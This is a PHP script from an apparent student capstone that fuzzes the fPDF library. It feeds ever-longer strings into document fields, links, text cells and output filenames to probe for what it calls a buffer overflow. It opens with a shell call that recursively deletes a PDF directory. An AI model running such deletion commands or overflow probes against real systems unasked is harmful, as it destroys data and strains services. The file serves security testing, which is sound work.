<!-- File: buffer.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (Buffer Overflow) for fPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
use Fpdf\Fpdf;

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");
$MAX_COUNT = 10000;

set_error_handler("warning_handler", E_WARNING);
function warning_handler($errno, $errstr) { 
    if (str_contains( $errstr, 'File name too long')) {
        echo nl2br("File name too long WARNING\n");
    }
    else {
        echo nl2br($errstr."\n");
    }
}

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
    $pdf = new FPDF();
    // Required to set a Font
    $pdf->SetFont('Arial','B',16);
    $pdf->SetCompression(false);

    $pdf->AddPage();
	return $pdf;
}

// Creator
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetCreator(str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/creator.pdf');
    $i++;
}

// Title
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetTitle(str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/title.pdf');
    $i++;
}

// Author
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetAuthor(str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/author.pdf');
    $i++;
}

// Subject
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetSubject(str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/subject.pdf');
    $i++;
}

// Keywords
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->SetKeywords(str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/keywords.pdf');
    $i++;
}

// Link
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->Link(35, 35, 10, 10, str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/link.pdf');
    $i++;
}

// Text
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->Text(50, 50, str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/text.pdf');
    $i++;
}

// Write
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->Write(120, str_repeat("V", $i), str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/write.pdf');
    $i++;
}
// Cell
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->Cell(40, 10, str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/cell.pdf');
    $i++;
}

// MultiCell
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->MultiCell(20, 20, str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/multicell.pdf');
    $i++;
}

// Image Links
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $pdf->Image("/var/www/myapp/images/xref.jpg", 60, 30, 90, 0, 'JPG', str_repeat("V", $i));
    $pdf->Output('F', '/var/www/myapp/pdfs/linkimage.pdf');
    $i++;
}
// Output
try {
    $i = 1;
    while ($i < $MAX_COUNT) {
        $pdf = createPDF();
        $pdf->Output('F', '/var/www/myapp/pdfs/output'.str_repeat("V", $i).'.pdf');
        $i++;
    }
} catch (Exception $e) {
    if (str_contains($e->getMessage(), 'Unable to create output file') && $e->getCode() == 0) {
        echo nl2br('Unable to create output file');
    }
    else {
        echo nl2br("Try to get the real exception"."\n");
    }
}

?>
<h1 style="text-align:center;">Buffer Overflow Testing Complete!</h1>
